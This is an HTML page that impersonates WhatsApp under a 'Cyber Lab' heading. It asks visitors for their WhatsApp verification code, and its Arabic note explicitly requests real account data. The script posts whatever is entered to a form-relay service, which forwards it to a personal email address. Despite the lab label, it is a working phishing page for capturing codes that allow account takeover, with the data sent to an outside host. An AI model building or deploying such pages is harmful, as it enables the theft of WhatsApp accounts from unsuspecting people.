
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WhatsApp - تجربة الأرقام</title>
<style>
body {
  margin: 0;
  background: #f5f5f5;
  font-family: Arial, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
}
.panel {
  background: white;
  width: 85%;
  max-width: 360px;
  padding: 28px 22px;
  border-radius: 12px;
  text-align: center;
  box-shadow: 0 2px 12px #0001;
}
h2 { color: #222; }
input {
  box-sizing: border-box;
  width: 100%;
  padding: 14px;
  margin: 18px 0;
  border: 1px solid #ccc;
  border-radius: 7px;
  font-size: 18px;
  text-align: center;
}
button {
  width: 100%;
  padding: 14px;
  border: 0;
  border-radius: 7px;
  background: #176b45;
  color: white;
  font-size: 17px;
}
.note {
  color: #777;
  font-size: 13px;
}
</style>
</head>
<body>
<div class="panel">
  <h2>Cyber Lab</h2>
  </p>إرسال رقم اختبار التحقق</p>
  <form id="testForm">
    <input
      type="text"
      name="test_number"
      placeholder="اكتب رقم التحقق"
      inputmode="numeric"
      required
    >
    <button type="submit">إرسال التحقق </button>
  </form>
  <p class="note">هذه صفحة واتساب مستقلة.  رجاءادخل رمز تحقق و بيانات حسابات حقيقية.</p>
  <p id="status"></p>
</div>

<script>
document.getElementById("testForm").addEventListener("submit", async function(e) {
  e.preventDefault();
  const status = document.getElementById("status");
  status.textContent = "جارٍ الإرسال...";

  try {
    const response = await fetch("https://formsubmit.co/ajax/mohammedalkanoni63@gmail.com", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json"
      },
      body: JSON.stringify({
        test_number: this.test_number.value,
        _subject: " رقم االتحقق من واتساب WhatsApp"
      })
    });

    if (!response.ok) throw new Error("Send failed");
    status.textContent = "تم إرسال رقم التحقق .";
    this.reset();
  } catch (error) {
    status.textContent = "تعذر الإرسال. تحقق من إعداد البريد.";
  }
});
</script>
</body>
</html>
